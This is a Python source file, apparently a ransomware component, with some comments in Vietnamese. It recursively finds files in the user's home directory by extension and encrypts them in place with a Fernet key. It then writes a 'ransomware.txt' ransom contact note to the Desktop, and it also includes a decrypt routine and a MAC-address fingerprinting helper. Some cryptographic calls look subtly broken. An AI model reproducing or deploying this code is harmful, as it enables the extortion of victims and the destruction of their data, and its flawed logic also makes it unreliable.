import os
import yaml
import mmap
import shutil
import psutil
from pathlib import Path
from cryptography.fernet import Fernet


def GetMac() -> str:
    try:
        # Tạo danh sách các địa chỉ MAC từ giao diện mạng
        address_mac = [
            address.address 
            for addresses in psutil.net_if_addrs().values() 
            for address in addresses 
            if address.family == psutil.AF_LINK
        ]
        # Trả về hai địa chỉ MAC đầu tiên được ngăn cách bởi dấu "|"
        return '|'.join(address_mac[1:3]) if len(address_mac) >= 3 else 'No-Mac'
    except:
        # Trả về 'No-Mac' nếu có lỗi xảy ra
        return 'No-Mac'


def Encrypt(Private: Fernet):
    for _, files in List_Files().items():
        for file in files:
            temp_file = file + '.temp'
            try:
                with open(file, 'rb') as original_file, open(temp_file, 'wb') as encfile:
                    with mmap.mmap(original_file.fileno(), 0, access=mmap.ACCESS_READ) as mm:
                        offset = 0
                        while offset < len(mm):
                            chunk = mm[offset:offset + 4096 * 1024]
                            if not chunk:
                                break
                            enc_chunk = Private.encrypt(chunk, 32)[0]
                            encfile.write(enc_chunk)
                            offset += len(chunk)
                shutil.move(temp_file, file)
            except Exception:
                pass
            finally:
                if os.path.exists(temp_file):
                    os.remove(temp_file)


def Decrypt(Private: Fernet):
    for _, files in List_Files().items():
        for file in files:
            temp_file = file + '.temp'
            try:
                with open(file, 'rb') as encrypted_file, open(temp_file, 'wb') as decfile:
                    with mmap.mmap(encrypted_file.fileno(), 0, access=mmap.ACCESS_READ) as mm:
                        offset = 0
                        while offset < len(mm):
                            chunk = mm[offset:offset + 4096 * 1024]
                            if not chunk:
                                break
                            dec_chunk = Private.decrypt(chunk)
                            decfile.write(dec_chunk)
                            offset += len(chunk)
                shutil.move(temp_file, file)
            except Exception:
                pass
            finally:
                if os.path.exists(temp_file):
                    os.remove(temp_file)


def Contact():
    home = Path.home()
    desktop = home / "Desktop" / 'ransomware.txt'
    with open('scripts/info.yaml', 'r') as file:
        info = yaml.safe_load(file)

    if desktop.exists():
        desktop.unlink()

    try:
        with open(desktop, 'w') as file:
            file.write(info['contact']) 
    except Exception as e:
        with open(home / 'ransomware.txt', 'w') as file:
            file.write(info['contact']) 


def List_Files() -> dict:
    with open('scripts/extensions.yaml', 'r') as file:
        exts = yaml.safe_load(file)

    file_categories = {category: [] for category in exts}
    extcategory = {ext: category for category, ext_list in exts.items() for ext in ext_list}

    for entry in Path.home().rglob('*'):
        if entry.is_file() and (ext := entry.suffix.lower()) in extcategory:
            file_categories[extcategory[ext]].append(str(entry))

    return file_categories
